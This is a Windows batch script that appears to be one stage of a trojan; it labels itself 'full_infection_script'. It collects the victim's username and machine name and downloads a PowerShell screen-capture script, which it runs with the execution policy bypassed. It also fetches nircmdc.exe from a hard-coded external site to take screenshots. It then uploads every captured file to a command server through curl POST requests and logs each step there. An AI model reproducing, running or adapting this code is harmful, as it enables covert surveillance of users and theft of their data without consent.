REM jobcode set by retrieve.php
REM SET jobcode=
REM SET source=
REM SET mothership=
REM SET mothershipassets=

set /a error_code=0

set sessionid=99%random%%random%%random%%random%%random%
set sessionid=%sessionid:~0,8%
set batchid=%sessionid%

SET "trojandir=%temp%\owd"

IF NOT EXIST %trojandir% (
    goto :error_owd_folder_missing
)

set clientid=xxxxxxxx

IF EXIST %trojandir%\client_id (
    set /p clientid=<%trojandir%\client_id
)

set clientid=%clientid:~0,8%

IF "%clientid%"=="xxxxxxxx" (
    goto :error_not_able_to_extract_clientid
)

REM 20260321184244.052000-240
REM %RANDOM% -- 4 digits
set tt=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%

SET "timestamp=%tt:~0,14%%tt:~15,4%"

cd /d %trojandir%
        
set workdir=%trojandir%\cmdlist_%timestamp%

md %workdir%

cd /d %workdir%
    
set logfname=cmdlist_%timestamp%.log
SET "logfpath=%workdir%\%logfname%"


echo %USERNAME% > %trojandir%\username
SET /P tusername=<%trojandir%\username
set "tusername=%tusername: =%"

IF "%tusername%"=="" (
    wmic computersystem get username | findstr /v UserName > %trojandir%\username
    set /p tusername=<%trojandir%\username
    set "tusername=%tusername:*\=%"
)

echo %COMPUTERNAME% > %trojandir%\machinename
SET /P machinename=<%trojandir%\machinename

set "machinename=%machinename: =%"

IF "%machinename%"=="" (
    wmic computersystem get name | findstr /v Name > %trojandir%\machinename
    SET /P machinename=<%trojandir%\machinename
)

set "machinename=%machinename: =%"

IF "%machinename%"=="" (

    FOR /F "tokens=2 delims=:" %%A IN ('systeminfo ^| findstr /B /C:"Host Name"') DO (
        set "myHost=%%A"
    )
    set "myHost=%myHost:~1%"

    set machinename=%myHost%
    
    echo %machinename% > %trojandir%\machinename
)

set scriptfullpath=%~f0
set source=%~nx0

set params=
set params=%params% --data-urlencode "source=%source%" 
set params=%params% --data-urlencode "sessionid=%sessionid%" 
set params=%params% --data-urlencode "jobcode=%jobcode%" 
set params=%params% --data-urlencode "batchid=%batchid%"
set params=%params% --data-urlencode "username=%tusername%"
set params=%params% --data-urlencode "machinename=%machinename%"
set params=%params% --data-urlencode "clientid=%clientid%"
set params=%params% --data-urlencode "script_version=full_infection_script"

curl -G %mothership%/ow/logmsg.php --data-urlencode "event=start_job" %params%


REM ----------

set msg=setup done
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" %params%

REM ----------

curl -o %trojandir%\get_full_screen_capture.ps1 -G %mothership%/ow/assets/get_full_screen_capture.ps1

IF EXIST %trojandir%\get_full_screen_capture.ps1 (
    powershell.exe -ExecutionPolicy Bypass -File %trojandir%\get_full_screen_capture.ps1 > %workdir%\get_full_screen_capture.ps1_cmd.log 2>&1
)

IF NOT EXIST %trojandir%\nircmdc.exe (
    curl -o %trojandir%\nircmdc.exe -G https://seashell-raven-793508.hostingersite.com/ow/retrieve.php --data-urlencode "filename=nircmdc.exe" --data-urlencode "clientid=%clientid%" --data-urlencode "sessionid=%sessionid%" --data-urlencode "source=%source%" --data-urlencode "batchid=%batchid%" --data-urlencode "jobcode=%jobcode%"
)

IF EXIST %trojandir%\nircmdc.exe (
    start "" /min %trojandir%\nircmdc.exe savescreenshot %workdir%\nircmd_screenshot.png
)


REM ---------- upload artifacts

set msg=starting uploadfiles
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" %params%

cd /d %workdir%

FOR %%F IN ("*") DO (

    curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=uploading %%F" %params%

    curl -X POST --data-binary "@%%F" %mothership%/ow/upload.php?batchid=%batchid%^&filename=%%F^&clientid=%clientid%^&source=%source%^&sessionid=%sessionid%^&jobcode=%jobcode%^&username=%username%^&machinename=%machinename% 
)



curl -G %mothership%/ow/logmsg.php --data-urlencode "event=job_finished" %params%

exit

:error_RunHiddenPSx_missing
set /a error_code+=1
:error_RunHiddenPSx_missing
set /a error_code+=1
:error_full_screen_capture_missing
set /a error_code+=1
:error_full_screen_capture_empty
set /a error_code+=1
:error_retrieve_get_macaddr_failed
set /a error_code+=1
:error_upgrade_download_failed
set /a error_code+=1
:error_not_able_to_extract_clientid
set /a error_code+=1
:error_not_able_to_extract_sessionid
set /a error_code+=1
:error_owd_folder_missing
set /a error_code+=1

set msg=errors occurred while executing error_code %error_code%

curl -G %mothership%/ow/logmsg.php --data-urlencode "event=job_finished_with_error" --data-urlencode "errorcode=%error_code%" %params%

exit
